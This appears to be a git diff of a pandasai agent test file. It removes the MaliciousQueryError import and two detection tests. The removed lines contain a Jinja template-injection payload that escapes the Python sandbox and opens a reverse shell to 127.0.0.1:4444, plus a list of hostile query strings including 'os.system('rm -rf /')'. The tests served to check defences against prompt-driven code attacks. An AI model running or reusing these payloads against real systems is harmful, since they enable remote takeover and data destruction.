@@ -8,7 +8,7 @@ import pytest
 from pandasai.agent.base import Agent
 from pandasai.config import Config, ConfigManager
 from pandasai.dataframe.base import DataFrame
-from pandasai.exceptions import CodeExecutionError, MaliciousQueryError
+from pandasai.exceptions import CodeExecutionError
 from pandasai.helpers.dataframe_serializer import DataframeSerializerType
 from pandasai.llm.fake import FakeLLM
 
@@ -435,30 +435,6 @@ class TestAgent:
         codes = ["code1", "code2"]
         with pytest.raises(ValueError):
             agent.train(codes)
-
-    def test_malicious_query_detection(self, sample_df, config):
-        agent = Agent(sample_df, config, memory_size=10)
-
-        with pytest.raises(MaliciousQueryError):
-            agent.chat(
-                """{% for x in ().__class__.__base__.__subclasses__() %} {% if "warning" in x.__name__ %} {{x()._module.__builtins__['__import__']('os').popen('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\\'')}} {% endif %} {% endfor %}"""
-            )
-
-    def test_query_detection(self, sample_df, config, agent: Agent):
-        # Positive cases: should detect malicious keywords
-        malicious_queries = [
-            "import os",
-            "import io",
-            "chr(97)",
-            "base64.b64decode",
-            "file = open('file.txt', 'os')",
-            "os.system('rm -rf /')",
-            "io.open('file.txt', 'w')",
-        ]
-
-        for query in malicious_queries:
-            with pytest.raises(MaliciousQueryError):
-                agent.chat(query)
 
     def test_get_config_none(self, agent: Agent):
         """Test that _get_config returns global config when input is None"""
